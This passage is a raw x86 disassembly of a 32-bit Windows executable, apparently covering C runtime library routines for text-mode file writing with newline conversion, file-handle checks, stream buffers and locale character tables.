  404233:	push   0x0
  404235:	lea    eax,[ebp-0x1ac4]
  40423b:	push   eax
  40423c:	push   0x1
  40423e:	lea    eax,[ebp-0xc]
  404241:	push   eax
  404242:	mov    eax,DWORD PTR [ebp-0x1ad8]
  404248:	mov    eax,DWORD PTR [eax]
  40424a:	mov    BYTE PTR [ebp-0xc],0xd
  40424e:	push   DWORD PTR [edi+eax*1]
  404251:	call   DWORD PTR ds:0x40b0c0
  404257:	test   eax,eax
  404259:	je     0x40462f
  40425f:	cmp    DWORD PTR [ebp-0x1ac4],0x1
  404266:	jl     0x40463b
  40426c:	inc    DWORD PTR [ebp-0x1ad0]
  404272:	inc    DWORD PTR [ebp-0x1ac8]
  404278:	jmp    0x404300
  40427d:	cmp    al,0x1
  40427f:	je     0x404285
  404281:	cmp    al,0x2
  404283:	jne    0x4042a6
  404285:	movzx  esi,WORD PTR [ebx]
  404288:	xor    ecx,ecx
  40428a:	cmp    si,0xa
  40428e:	sete   cl
  404291:	inc    ebx
  404292:	inc    ebx
  404293:	add    DWORD PTR [ebp-0x1abc],0x2
  40429a:	mov    DWORD PTR [ebp-0x1ac0],esi
  4042a0:	mov    DWORD PTR [ebp-0x1ae0],ecx
  4042a6:	cmp    al,0x1
  4042a8:	je     0x4042ae
  4042aa:	cmp    al,0x2
  4042ac:	jne    0x404300
  4042ae:	push   DWORD PTR [ebp-0x1ac0]
  4042b4:	call   0x40873f
  4042b9:	pop    ecx
  4042ba:	cmp    ax,WORD PTR [ebp-0x1ac0]
  4042c1:	jne    0x40462f
  4042c7:	add    DWORD PTR [ebp-0x1ac8],0x2
  4042ce:	cmp    DWORD PTR [ebp-0x1ae0],0x0
  4042d5:	je     0x404300
  4042d7:	push   0xd
  4042d9:	pop    eax
  4042da:	push   eax
  4042db:	mov    DWORD PTR [ebp-0x1ac0],eax
  4042e1:	call   0x40873f
  4042e6:	pop    ecx
  4042e7:	cmp    ax,WORD PTR [ebp-0x1ac0]
  4042ee:	jne    0x40462f
  4042f4:	inc    DWORD PTR [ebp-0x1ac8]
  4042fa:	inc    DWORD PTR [ebp-0x1ad0]
  404300:	mov    eax,DWORD PTR [ebp+0x10]
  404303:	cmp    DWORD PTR [ebp-0x1abc],eax
  404309:	jb     0x404108
  40430f:	jmp    0x40463b
  404314:	mov    ecx,DWORD PTR [esi]
  404316:	mov    dl,BYTE PTR [ebx]
  404318:	inc    DWORD PTR [ebp-0x1ac8]
  40431e:	mov    BYTE PTR [edi+ecx*1+0x34],dl
  404322:	mov    ecx,DWORD PTR [esi]
  404324:	mov    DWORD PTR [edi+ecx*1+0x38],eax
  404328:	jmp    0x40463b
  40432d:	xor    ecx,ecx
  40432f:	mov    eax,DWORD PTR [esi]
  404331:	add    eax,edi
  404333:	test   BYTE PTR [eax+0x4],0x80
  404337:	je     0x4045fc
  40433d:	mov    eax,DWORD PTR [ebp-0x1acc]
  404343:	mov    DWORD PTR [ebp-0x1ac0],ecx
  404349:	test   bl,bl
  40434b:	jne    0x40441b
  404351:	mov    DWORD PTR [ebp-0x1ac4],eax
  404357:	cmp    DWORD PTR [ebp+0x10],ecx
  40435a:	jbe    0x404680
  404360:	jmp    0x404368
  404362:	mov    esi,DWORD PTR [ebp-0x1ad8]
  404368:	mov    ecx,DWORD PTR [ebp-0x1ac4]
  40436e:	and    DWORD PTR [ebp-0x1abc],0x0
  404375:	sub    ecx,DWORD PTR [ebp-0x1acc]
  40437b:	lea    eax,[ebp-0x1ab8]
  404381:	cmp    ecx,DWORD PTR [ebp+0x10]
  404384:	jae    0x4043bf
  404386:	mov    edx,DWORD PTR [ebp-0x1ac4]
  40438c:	inc    DWORD PTR [ebp-0x1ac4]
  404392:	mov    dl,BYTE PTR [edx]
  404394:	inc    ecx
  404395:	cmp    dl,0xa
  404398:	jne    0x4043aa
  40439a:	inc    DWORD PTR [ebp-0x1ad0]
  4043a0:	mov    BYTE PTR [eax],0xd
  4043a3:	inc    eax
  4043a4:	inc    DWORD PTR [ebp-0x1abc]
  4043aa:	mov    BYTE PTR [eax],dl
  4043ac:	inc    eax
  4043ad:	inc    DWORD PTR [ebp-0x1abc]
  4043b3:	cmp    DWORD PTR [ebp-0x1abc],0x13ff
  4043bd:	jb     0x404381
  4043bf:	mov    ebx,eax
  4043c1:	lea    eax,[ebp-0x1ab8]
  4043c7:	sub    ebx,eax
  4043c9:	push   0x0
  4043cb:	lea    eax,[ebp-0x1ad4]
  4043d1:	push   eax
  4043d2:	push   ebx
  4043d3:	lea    eax,[ebp-0x1ab8]
  4043d9:	push   eax
  4043da:	mov    eax,DWORD PTR [esi]
  4043dc:	push   DWORD PTR [edi+eax*1]
  4043df:	call   DWORD PTR ds:0x40b0c0
  4043e5:	test   eax,eax
  4043e7:	je     0x40462f
  4043ed:	mov    eax,DWORD PTR [ebp-0x1ad4]
  4043f3:	add    DWORD PTR [ebp-0x1ac8],eax
  4043f9:	cmp    eax,ebx
  4043fb:	jl     0x40463b
  404401:	mov    eax,DWORD PTR [ebp-0x1ac4]
  404407:	sub    eax,DWORD PTR [ebp-0x1acc]
  40440d:	cmp    eax,DWORD PTR [ebp+0x10]
  404410:	jb     0x404362
  404416:	jmp    0x40463b
  40441b:	mov    DWORD PTR [ebp-0x1abc],eax
  404421:	cmp    bl,0x2
  404424:	jne    0x4044fb
  40442a:	cmp    DWORD PTR [ebp+0x10],ecx
  40442d:	jbe    0x404680
  404433:	jmp    0x40443b
  404435:	mov    esi,DWORD PTR [ebp-0x1ad8]
  40443b:	mov    ecx,DWORD PTR [ebp-0x1abc]
  404441:	and    DWORD PTR [ebp-0x1ac4],0x0
  404448:	sub    ecx,DWORD PTR [ebp-0x1acc]
  40444e:	lea    eax,[ebp-0x1ab8]
  404454:	cmp    ecx,DWORD PTR [ebp+0x10]
  404457:	jae    0x40449f
  404459:	mov    edx,DWORD PTR [ebp-0x1abc]
  40445f:	add    DWORD PTR [ebp-0x1abc],0x2
  404466:	movzx  edx,WORD PTR [edx]
  404469:	inc    ecx
  40446a:	inc    ecx
  40446b:	cmp    dx,0xa
  40446f:	jne    0x404487
  404471:	add    DWORD PTR [ebp-0x1ad0],0x2
  404478:	push   0xd
  40447a:	pop    ebx
  40447b:	mov    WORD PTR [eax],bx
  40447e:	inc    eax
  40447f:	inc    eax
  404480:	add    DWORD PTR [ebp-0x1ac4],0x2
  404487:	add    DWORD PTR [ebp-0x1ac4],0x2
  40448e:	mov    WORD PTR [eax],dx
  404491:	inc    eax
  404492:	inc    eax
  404493:	cmp    DWORD PTR [ebp-0x1ac4],0x13fe
  40449d:	jb     0x404454
  40449f:	mov    ebx,eax
  4044a1:	lea    eax,[ebp-0x1ab8]
  4044a7:	sub    ebx,eax
  4044a9:	push   0x0
  4044ab:	lea    eax,[ebp-0x1ad4]
  4044b1:	push   eax
  4044b2:	push   ebx
  4044b3:	lea    eax,[ebp-0x1ab8]
  4044b9:	push   eax
  4044ba:	mov    eax,DWORD PTR [esi]
  4044bc:	push   DWORD PTR [edi+eax*1]
  4044bf:	call   DWORD PTR ds:0x40b0c0
  4044c5:	test   eax,eax
  4044c7:	je     0x40462f
  4044cd:	mov    eax,DWORD PTR [ebp-0x1ad4]
  4044d3:	add    DWORD PTR [ebp-0x1ac8],eax
  4044d9:	cmp    eax,ebx
  4044db:	jl     0x40463b
  4044e1:	mov    eax,DWORD PTR [ebp-0x1abc]
  4044e7:	sub    eax,DWORD PTR [ebp-0x1acc]
  4044ed:	cmp    eax,DWORD PTR [ebp+0x10]
  4044f0:	jb     0x404435
  4044f6:	jmp    0x40463b
  4044fb:	cmp    DWORD PTR [ebp+0x10],ecx
  4044fe:	jbe    0x404680
  404504:	mov    ecx,DWORD PTR [ebp-0x1abc]
  40450a:	and    DWORD PTR [ebp-0x1ac4],0x0
  404511:	sub    ecx,DWORD PTR [ebp-0x1acc]
  404517:	push   0x2
  404519:	lea    eax,[ebp-0x6b8]
  40451f:	pop    esi
  404520:	cmp    ecx,DWORD PTR [ebp+0x10]
  404523:	jae    0x404561
  404525:	mov    edx,DWORD PTR [ebp-0x1abc]
  40452b:	movzx  edx,WORD PTR [edx]
  40452e:	add    DWORD PTR [ebp-0x1abc],esi
  404534:	add    ecx,esi
  404536:	cmp    dx,0xa
  40453a:	jne    0x40454a
  40453c:	push   0xd
  40453e:	pop    ebx
  40453f:	mov    WORD PTR [eax],bx
  404542:	add    eax,esi
  404544:	add    DWORD PTR [ebp-0x1ac4],esi
  40454a:	add    DWORD PTR [ebp-0x1ac4],esi
  404550:	mov    WORD PTR [eax],dx
  404553:	add    eax,esi
  404555:	cmp    DWORD PTR [ebp-0x1ac4],0x6a8
  40455f:	jb     0x404520
  404561:	xor    esi,esi
  404563:	push   esi
  404564:	push   esi
  404565:	push   0xd55
  40456a:	lea    ecx,[ebp-0x1410]
  404570:	push   ecx
  404571:	lea    ecx,[ebp-0x6b8]
  404577:	sub    eax,ecx
  404579:	cdq    
  40457a:	sub    eax,edx
  40457c:	sar    eax,1
  40457e:	push   eax
  40457f:	mov    eax,ecx
  404581:	push   eax
  404582:	push   esi
  404583:	push   0xfde9
  404588:	call   DWORD PTR ds:0x40b124
  40458e:	mov    ebx,eax
  404590:	cmp    ebx,esi
  404592:	je     0x40462f
  404598:	push   0x0
  40459a:	lea    eax,[ebp-0x1ad4]
  4045a0:	push   eax
  4045a1:	mov    eax,ebx
  4045a3:	sub    eax,esi
  4045a5:	push   eax
  4045a6:	lea    eax,[ebp+esi*1-0x1410]
  4045ad:	push   eax
  4045ae:	mov    eax,DWORD PTR [ebp-0x1ad8]
  4045b4:	mov    eax,DWORD PTR [eax]
  4045b6:	push   DWORD PTR [edi+eax*1]
  4045b9:	call   DWORD PTR ds:0x40b0c0
  4045bf:	test   eax,eax
  4045c1:	je     0x4045cf
  4045c3:	add    esi,DWORD PTR [ebp-0x1ad4]
  4045c9:	cmp    ebx,esi
  4045cb:	jg     0x404598
  4045cd:	jmp    0x4045db
  4045cf:	call   DWORD PTR ds:0x40b08c
  4045d5:	mov    DWORD PTR [ebp-0x1ac0],eax
  4045db:	cmp    ebx,esi
  4045dd:	jg     0x40463b
  4045df:	mov    eax,DWORD PTR [ebp-0x1abc]
  4045e5:	sub    eax,DWORD PTR [ebp-0x1acc]
  4045eb:	mov    DWORD PTR [ebp-0x1ac8],eax
  4045f1:	cmp    eax,DWORD PTR [ebp+0x10]
  4045f4:	jb     0x404504
  4045fa:	jmp    0x40463b
  4045fc:	push   0x0
  4045fe:	lea    ecx,[ebp-0x1ad4]
  404604:	push   ecx
  404605:	push   DWORD PTR [ebp+0x10]
  404608:	push   DWORD PTR [ebp-0x1acc]
  40460e:	push   DWORD PTR [eax]
  404610:	call   DWORD PTR ds:0x40b0c0
  404616:	test   eax,eax
  404618:	je     0x40462f
  40461a:	mov    eax,DWORD PTR [ebp-0x1ad4]
  404620:	and    DWORD PTR [ebp-0x1ac0],0x0
  404627:	mov    DWORD PTR [ebp-0x1ac8],eax
  40462d:	jmp    0x40463b
  40462f:	call   DWORD PTR ds:0x40b08c
  404635:	mov    DWORD PTR [ebp-0x1ac0],eax
  40463b:	cmp    DWORD PTR [ebp-0x1ac8],0x0
  404642:	jne    0x4046b0
  404644:	cmp    DWORD PTR [ebp-0x1ac0],0x0
  40464b:	je     0x40467a
  40464d:	push   0x5
  40464f:	pop    esi
  404650:	cmp    DWORD PTR [ebp-0x1ac0],esi
  404656:	jne    0x40466c
  404658:	call   0x4024b6
  40465d:	mov    DWORD PTR [eax],0x9
  404663:	call   0x4024c9
  404668:	mov    DWORD PTR [eax],esi
  40466a:	jmp    0x4046ab
  40466c:	push   DWORD PTR [ebp-0x1ac0]
  404672:	call   0x4024dc
  404677:	pop    ecx
  404678:	jmp    0x4046ab
  40467a:	mov    esi,DWORD PTR [ebp-0x1ad8]
  404680:	mov    eax,DWORD PTR [esi]
  404682:	test   BYTE PTR [edi+eax*1+0x4],0x40
  404687:	je     0x404698
  404689:	mov    eax,DWORD PTR [ebp-0x1acc]
  40468f:	cmp    BYTE PTR [eax],0x1a
  404692:	jne    0x404698
  404694:	xor    eax,eax
  404696:	jmp    0x4046bc
  404698:	call   0x4024b6
  40469d:	mov    DWORD PTR [eax],0x1c
  4046a3:	call   0x4024c9
  4046a8:	and    DWORD PTR [eax],0x0
  4046ab:	or     eax,0xffffffff
  4046ae:	jmp    0x4046bc
  4046b0:	mov    eax,DWORD PTR [ebp-0x1ac8]
  4046b6:	sub    eax,DWORD PTR [ebp-0x1ad0]
  4046bc:	pop    edi
  4046bd:	pop    ebx
  4046be:	mov    ecx,DWORD PTR [ebp-0x4]
  4046c1:	xor    ecx,ebp
  4046c3:	pop    esi
  4046c4:	call   0x401d11
  4046c9:	leave  
  4046ca:	ret    
  4046cb:	push   0x10
  4046cd:	push   0x40c818
  4046d2:	call   0x403b74
  4046d7:	mov    eax,DWORD PTR [ebp+0x8]
  4046da:	cmp    eax,0xfffffffe
  4046dd:	jne    0x4046fa
  4046df:	call   0x4024c9
  4046e4:	and    DWORD PTR [eax],0x0
  4046e7:	call   0x4024b6
  4046ec:	mov    DWORD PTR [eax],0x9
  4046f2:	or     eax,0xffffffff
  4046f5:	jmp    0x404797
  4046fa:	xor    edi,edi
  4046fc:	cmp    eax,edi
  4046fe:	jl     0x404708
  404700:	cmp    eax,DWORD PTR ds:0x412450
  404706:	jb     0x404729
  404708:	call   0x4024c9
  40470d:	mov    DWORD PTR [eax],edi
  40470f:	call   0x4024b6
  404714:	mov    DWORD PTR [eax],0x9
  40471a:	push   edi
  40471b:	push   edi
  40471c:	push   edi
  40471d:	push   edi
  40471e:	push   edi
  40471f:	call   0x40244e
  404724:	add    esp,0x14
  404727:	jmp    0x4046f2
  404729:	mov    ecx,eax
  40472b:	sar    ecx,0x5
  40472e:	lea    ebx,[ecx*4+0x412460]
  404735:	mov    esi,eax
  404737:	and    esi,0x1f
  40473a:	shl    esi,0x6
  40473d:	mov    ecx,DWORD PTR [ebx]
  40473f:	movsx  ecx,BYTE PTR [ecx+esi*1+0x4]
  404744:	and    ecx,0x1
  404747:	je     0x404708
  404749:	push   eax
  40474a:	call   0x408678
  40474f:	pop    ecx
  404750:	mov    DWORD PTR [ebp-0x4],edi
  404753:	mov    eax,DWORD PTR [ebx]
  404755:	test   BYTE PTR [eax+esi*1+0x4],0x1
  40475a:	je     0x404772
  40475c:	push   DWORD PTR [ebp+0x10]
  40475f:	push   DWORD PTR [ebp+0xc]
  404762:	push   DWORD PTR [ebp+0x8]
  404765:	call   0x403f98
  40476a:	add    esp,0xc
  40476d:	mov    DWORD PTR [ebp-0x1c],eax
  404770:	jmp    0x404788
  404772:	call   0x4024b6
  404777:	mov    DWORD PTR [eax],0x9
  40477d:	call   0x4024c9
  404782:	mov    DWORD PTR [eax],edi
  404784:	or     DWORD PTR [ebp-0x1c],0xffffffff
  404788:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40478f:	call   0x40479d
  404794:	mov    eax,DWORD PTR [ebp-0x1c]
  404797:	call   0x403bb9
  40479c:	ret    
  40479d:	push   DWORD PTR [ebp+0x8]
  4047a0:	call   0x408718
  4047a5:	pop    ecx
  4047a6:	ret    
  4047a7:	mov    edi,edi
  4047a9:	push   ebp
  4047aa:	mov    ebp,esp
  4047ac:	inc    DWORD PTR ds:0x40f7b8
  4047b2:	push   0x1000
  4047b7:	call   0x4027d8
  4047bc:	pop    ecx
  4047bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4047c0:	mov    DWORD PTR [ecx+0x8],eax
  4047c3:	test   eax,eax
  4047c5:	je     0x4047d4
  4047c7:	or     DWORD PTR [ecx+0xc],0x8
  4047cb:	mov    DWORD PTR [ecx+0x18],0x1000
  4047d2:	jmp    0x4047e5
  4047d4:	or     DWORD PTR [ecx+0xc],0x4
  4047d8:	lea    eax,[ecx+0x14]
  4047db:	mov    DWORD PTR [ecx+0x8],eax
  4047de:	mov    DWORD PTR [ecx+0x18],0x2
  4047e5:	mov    eax,DWORD PTR [ecx+0x8]
  4047e8:	and    DWORD PTR [ecx+0x4],0x0
  4047ec:	mov    DWORD PTR [ecx],eax
  4047ee:	pop    ebp
  4047ef:	ret    
  4047f0:	mov    edi,edi
  4047f2:	push   ebp
  4047f3:	mov    ebp,esp
  4047f5:	mov    eax,DWORD PTR [ebp+0x8]
  4047f8:	cmp    eax,0xfffffffe
  4047fb:	jne    0x40480c
  4047fd:	call   0x4024b6
  404802:	mov    DWORD PTR [eax],0x9
  404808:	xor    eax,eax
  40480a:	pop    ebp
  40480b:	ret    
  40480c:	push   esi
  40480d:	xor    esi,esi
  40480f:	cmp    eax,esi
  404811:	jl     0x40481b
  404813:	cmp    eax,DWORD PTR ds:0x412450
  404819:	jb     0x404837
  40481b:	call   0x4024b6
  404820:	push   esi
  404821:	push   esi
  404822:	push   esi
  404823:	push   esi
  404824:	push   esi
  404825:	mov    DWORD PTR [eax],0x9
  40482b:	call   0x40244e
  404830:	add    esp,0x14
  404833:	xor    eax,eax
  404835:	jmp    0x404851
  404837:	mov    ecx,eax
  404839:	and    eax,0x1f
  40483c:	sar    ecx,0x5
  40483f:	mov    ecx,DWORD PTR [ecx*4+0x412460]
  404846:	shl    eax,0x6
  404849:	movsx  eax,BYTE PTR [ecx+eax*1+0x4]
  40484e:	and    eax,0x40
  404851:	pop    esi
  404852:	pop    ebp
  404853:	ret    
  404854:	mov    eax,0x40e2a0
  404859:	ret    
  40485a:	mov    eax,ds:0x412440
  40485f:	push   esi
  404860:	push   0x14
  404862:	pop    esi
  404863:	test   eax,eax
  404865:	jne    0x40486e
  404867:	mov    eax,0x200
  40486c:	jmp    0x404874
  40486e:	cmp    eax,esi
  404870:	jge    0x404879
  404872:	mov    eax,esi
  404874:	mov    ds:0x412440,eax
  404879:	push   0x4
  40487b:	push   eax
  40487c:	call   0x40281d
  404881:	pop    ecx
  404882:	pop    ecx
  404883:	mov    ds:0x411424,eax
  404888:	test   eax,eax
  40488a:	jne    0x4048aa
  40488c:	push   0x4
  40488e:	push   esi
  40488f:	mov    DWORD PTR ds:0x412440,esi
  404895:	call   0x40281d
  40489a:	pop    ecx
  40489b:	pop    ecx
  40489c:	mov    ds:0x411424,eax
  4048a1:	test   eax,eax
  4048a3:	jne    0x4048aa
  4048a5:	push   0x1a
  4048a7:	pop    eax
  4048a8:	pop    esi
  4048a9:	ret    
  4048aa:	xor    edx,edx
  4048ac:	mov    ecx,0x40e2a0
  4048b1:	jmp    0x4048b8
  4048b3:	mov    eax,ds:0x411424
  4048b8:	mov    DWORD PTR [edx+eax*1],ecx
  4048bb:	add    ecx,0x20
  4048be:	add    edx,0x4
  4048c1:	cmp    ecx,0x40e520
  4048c7:	jl     0x4048b3
  4048c9:	push   0xfffffffe
  4048cb:	pop    esi
  4048cc:	xor    edx,edx
  4048ce:	mov    ecx,0x40e2b0
  4048d3:	push   edi
  4048d4:	mov    eax,edx
  4048d6:	sar    eax,0x5
  4048d9:	mov    eax,DWORD PTR [eax*4+0x412460]
  4048e0:	mov    edi,edx
  4048e2:	and    edi,0x1f
  4048e5:	shl    edi,0x6
  4048e8:	mov    eax,DWORD PTR [edi+eax*1]
  4048eb:	cmp    eax,0xffffffff
  4048ee:	je     0x4048f8
  4048f0:	cmp    eax,esi
  4048f2:	je     0x4048f8
  4048f4:	test   eax,eax
  4048f6:	jne    0x4048fa
  4048f8:	mov    DWORD PTR [ecx],esi
  4048fa:	add    ecx,0x20
  4048fd:	inc    edx
  4048fe:	cmp    ecx,0x40e310
  404904:	jl     0x4048d4
  404906:	pop    edi
  404907:	xor    eax,eax
  404909:	pop    esi
  40490a:	ret    
  40490b:	call   0x408a64
  404910:	cmp    BYTE PTR ds:0x40f274,0x0
  404917:	je     0x40491e
  404919:	call   0x40883b
  40491e:	push   DWORD PTR ds:0x411424
  404924:	call   0x402682
  404929:	pop    ecx
  40492a:	ret    
  40492b:	mov    edi,edi
  40492d:	push   ebp
  40492e:	mov    ebp,esp
  404930:	push   esi
  404931:	mov    esi,DWORD PTR [ebp+0x8]
  404934:	mov    eax,0x40e2a0
  404939:	cmp    esi,eax
  40493b:	jb     0x40495f
  40493d:	cmp    esi,0x40e500
  404943:	ja     0x40495f
  404945:	mov    ecx,esi
  404947:	sub    ecx,eax
  404949:	sar    ecx,0x5
  40494c:	add    ecx,0x10
  40494f:	push   ecx
  404950:	call   0x4066fe
  404955:	or     DWORD PTR [esi+0xc],0x8000
  40495c:	pop    ecx
  40495d:	jmp    0x404969
  40495f:	add    esi,0x20
  404962:	push   esi
  404963:	call   DWORD PTR ds:0x40b130
  404969:	pop    esi
  40496a:	pop    ebp
  40496b:	ret    
  40496c:	mov    edi,edi
  40496e:	push   ebp
  40496f:	mov    ebp,esp
  404971:	mov    eax,DWORD PTR [ebp+0x8]
  404974:	cmp    eax,0x14
  404977:	jge    0x40498f
  404979:	add    eax,0x10
  40497c:	push   eax
  40497d:	call   0x4066fe
  404982:	mov    eax,DWORD PTR [ebp+0xc]
  404985:	or     DWORD PTR [eax+0xc],0x8000
  40498c:	pop    ecx
  40498d:	pop    ebp
  40498e:	ret    
  40498f:	mov    eax,DWORD PTR [ebp+0xc]
  404992:	add    eax,0x20
  404995:	push   eax
  404996:	call   DWORD PTR ds:0x40b130
  40499c:	pop    ebp
  40499d:	ret    
  40499e:	mov    edi,edi
  4049a0:	push   ebp
  4049a1:	mov    ebp,esp
  4049a3:	mov    eax,DWORD PTR [ebp+0x8]
  4049a6:	mov    ecx,0x40e2a0
  4049ab:	cmp    eax,ecx
  4049ad:	jb     0x4049ce
  4049af:	cmp    eax,0x40e500
  4049b4:	ja     0x4049ce
  4049b6:	and    DWORD PTR [eax+0xc],0xffff7fff
  4049bd:	sub    eax,ecx
  4049bf:	sar    eax,0x5
  4049c2:	add    eax,0x10
  4049c5:	push   eax
  4049c6:	call   0x406624
  4049cb:	pop    ecx
  4049cc:	pop    ebp
  4049cd:	ret    
  4049ce:	add    eax,0x20
  4049d1:	push   eax
  4049d2:	call   DWORD PTR ds:0x40b134
  4049d8:	pop    ebp
  4049d9:	ret    
  4049da:	mov    edi,edi
  4049dc:	push   ebp
  4049dd:	mov    ebp,esp
  4049df:	mov    ecx,DWORD PTR [ebp+0x8]
  4049e2:	cmp    ecx,0x14
  4049e5:	mov    eax,DWORD PTR [ebp+0xc]
  4049e8:	jge    0x4049fd
  4049ea:	and    DWORD PTR [eax+0xc],0xffff7fff
  4049f1:	add    ecx,0x10
  4049f4:	push   ecx
  4049f5:	call   0x406624
  4049fa:	pop    ecx
  4049fb:	pop    ebp
  4049fc:	ret    
  4049fd:	add    eax,0x20
  404a00:	push   eax
  404a01:	call   DWORD PTR ds:0x40b134
  404a07:	pop    ebp
  404a08:	ret    
  404a09:	mov    edi,edi
  404a0b:	push   ebp
  404a0c:	mov    ebp,esp
  404a0e:	mov    eax,DWORD PTR [ebp+0x8]
  404a11:	push   esi
  404a12:	xor    esi,esi
  404a14:	cmp    eax,esi
  404a16:	jne    0x404a35
  404a18:	call   0x4024b6
  404a1d:	push   esi
  404a1e:	push   esi
  404a1f:	push   esi
  404a20:	push   esi
  404a21:	push   esi
  404a22:	mov    DWORD PTR [eax],0x16
  404a28:	call   0x40244e
  404a2d:	add    esp,0x14
  404a30:	or     eax,0xffffffff
  404a33:	jmp    0x404a38
  404a35:	mov    eax,DWORD PTR [eax+0x10]
  404a38:	pop    esi
  404a39:	pop    ebp
  404a3a:	ret    
  404a3b:	sub    eax,0x3a4
  404a40:	je     0x404a64
  404a42:	sub    eax,0x4
  404a45:	je     0x404a5e
  404a47:	sub    eax,0xd
  404a4a:	je     0x404a58
  404a4c:	dec    eax
  404a4d:	je     0x404a52
  404a4f:	xor    eax,eax
  404a51:	ret    
  404a52:	mov    eax,0x404
  404a57:	ret    
  404a58:	mov    eax,0x412
  404a5d:	ret    
  404a5e:	mov    eax,0x804
  404a63:	ret    
  404a64:	mov    eax,0x411
  404a69:	ret    
  404a6a:	mov    edi,edi
  404a6c:	push   esi
  404a6d:	push   edi
  404a6e:	mov    esi,eax
  404a70:	push   0x101
  404a75:	xor    edi,edi
  404a77:	lea    eax,[esi+0x1c]
  404a7a:	push   edi
  404a7b:	push   eax
  404a7c:	call   0x4058c0
  404a81:	xor    eax,eax
  404a83:	movzx  ecx,ax
  404a86:	mov    eax,ecx
  404a88:	mov    DWORD PTR [esi+0x4],edi
  404a8b:	mov    DWORD PTR [esi+0x8],edi
  404a8e:	mov    DWORD PTR [esi+0xc],edi
  404a91:	shl    ecx,0x10
  404a94:	or     eax,ecx
  404a96:	lea    edi,[esi+0x10]
  404a99:	stos   DWORD PTR es:[edi],eax
  404a9a:	stos   DWORD PTR es:[edi],eax
  404a9b:	stos   DWORD PTR es:[edi],eax
  404a9c:	mov    ecx,0x40e520
  404aa1:	add    esp,0xc
  404aa4:	lea    eax,[esi+0x1c]
  404aa7:	sub    ecx,esi
  404aa9:	mov    edi,0x101
  404aae:	mov    dl,BYTE PTR [ecx+eax*1]
  404ab1:	mov    BYTE PTR [eax],dl
  404ab3:	inc    eax
  404ab4:	dec    edi
  404ab5:	jne    0x404aae
  404ab7:	lea    eax,[esi+0x11d]
  404abd:	mov    esi,0x100
  404ac2:	mov    dl,BYTE PTR [eax+ecx*1]
  404ac5:	mov    BYTE PTR [eax],dl
  404ac7:	inc    eax
  404ac8:	dec    esi
  404ac9:	jne    0x404ac2
  404acb:	pop    edi
  404acc:	pop    esi
  404acd:	ret    
  404ace:	mov    edi,edi
  404ad0:	push   ebp
  404ad1:	mov    ebp,esp
  404ad3:	sub    esp,0x51c
  404ad9:	mov    eax,ds:0x40e004
  404ade:	xor    eax,ebp
  404ae0:	mov    DWORD PTR [ebp-0x4],eax
  404ae3:	push   ebx
  404ae4:	push   edi
  404ae5:	lea    eax,[ebp-0x518]
  404aeb:	push   eax
  404aec:	push   DWORD PTR [esi+0x4]
  404aef:	call   DWORD PTR ds:0x40b138
  404af5:	mov    edi,0x100
  404afa:	test   eax,eax
  404afc:	je     0x404bfd
  404b02:	xor    eax,eax
  404b04:	mov    BYTE PTR [ebp+eax*1-0x104],al
  404b0b:	inc    eax
  404b0c:	cmp    eax,edi
  404b0e:	jb     0x404b04
  404b10:	mov    al,BYTE PTR [ebp-0x512]
  404b16:	mov    BYTE PTR [ebp-0x104],0x20
  404b1d:	test   al,al
  404b1f:	je     0x404b4f
  404b21:	lea    ebx,[ebp-0x511]
  404b27:	movzx  ecx,al
  404b2a:	movzx  eax,BYTE PTR [ebx]
  404b2d:	cmp    ecx,eax
  404b2f:	ja     0x404b47
  404b31:	sub    eax,ecx
  404b33:	inc    eax
  404b34:	push   eax
  404b35:	lea    edx,[ebp+ecx*1-0x104]
  404b3c:	push   0x20
  404b3e:	push   edx
  404b3f:	call   0x4058c0
  404b44:	add    esp,0xc
  404b47:	inc    ebx
  404b48:	mov    al,BYTE PTR [ebx]
  404b4a:	inc    ebx
  404b4b:	test   al,al
  404b4d:	jne    0x404b27
  404b4f:	push   0x0
  404b51:	push   DWORD PTR [esi+0xc]
  404b54:	lea    eax,[ebp-0x504]
  404b5a:	push   DWORD PTR [esi+0x4]
  404b5d:	push   eax
  404b5e:	push   edi
  404b5f:	lea    eax,[ebp-0x104]
  404b65:	push   eax
  404b66:	push   0x1
  404b68:	push   0x0
  404b6a:	call   0x409031
  404b6f:	xor    ebx,ebx
  404b71:	push   ebx
  404b72:	push   DWORD PTR [esi+0x4]
  404b75:	lea    eax,[ebp-0x204]
  404b7b:	push   edi
  404b7c:	push   eax
  404b7d:	push   edi
  404b7e:	lea    eax,[ebp-0x104]
  404b84:	push   eax
  404b85:	push   edi
  404b86:	push   DWORD PTR [esi+0xc]
  404b89:	push   ebx
  404b8a:	call   0x408e32
  404b8f:	add    esp,0x44
  404b92:	push   ebx
  404b93:	push   DWORD PTR [esi+0x4]
  404b96:	lea    eax,[ebp-0x304]
  404b9c:	push   edi
  404b9d:	push   eax
  404b9e:	push   edi
  404b9f:	lea    eax,[ebp-0x104]
  404ba5:	push   eax
  404ba6:	push   0x200
  404bab:	push   DWORD PTR [esi+0xc]
  404bae:	push   ebx
  404baf:	call   0x408e32
  404bb4:	add    esp,0x24
  404bb7:	xor    eax,eax
  404bb9:	movzx  ecx,WORD PTR [ebp+eax*2-0x504]
  404bc1:	test   cl,0x1
  404bc4:	je     0x404bd4
  404bc6:	or     BYTE PTR [esi+eax*1+0x1d],0x10
  404bcb:	mov    cl,BYTE PTR [ebp+eax*1-0x204]
  404bd2:	jmp    0x404be5
  404bd4:	test   cl,0x2
  404bd7:	je     0x404bee
  404bd9:	or     BYTE PTR [esi+eax*1+0x1d],0x20
  404bde:	mov    cl,BYTE PTR [ebp+eax*1-0x304]
  404be5:	mov    BYTE PTR [esi+eax*1+0x11d],cl
  404bec:	jmp    0x404bf6
  404bee:	mov    BYTE PTR [esi+eax*1+0x11d],0x0
  404bf6:	inc    eax
  404bf7:	cmp    eax,edi
  404bf9:	jb     0x404bb9
  404bfb:	jmp    0x404c53
  404bfd:	lea    eax,[esi+0x11d]
  404c03:	mov    DWORD PTR [ebp-0x51c],0xffffff9f
  404c0d:	xor    ecx,ecx
  404c0f:	sub    DWORD PTR [ebp-0x51c],eax
  404c15:	mov    edx,DWORD PTR [ebp-0x51c]
  404c1b:	lea    eax,[esi+ecx*1+0x11d]
  404c22:	add    edx,eax
  404c24:	lea    ebx,[edx+0x20]
  404c27:	cmp    ebx,0x19
  404c2a:	ja     0x404c38
  404c2c:	or     BYTE PTR [esi+ecx*1+0x1d],0x10
  404c31:	mov    dl,cl
  404c33:	add    dl,0x20
  404c36:	jmp    0x404c47
  404c38:	cmp    edx,0x19
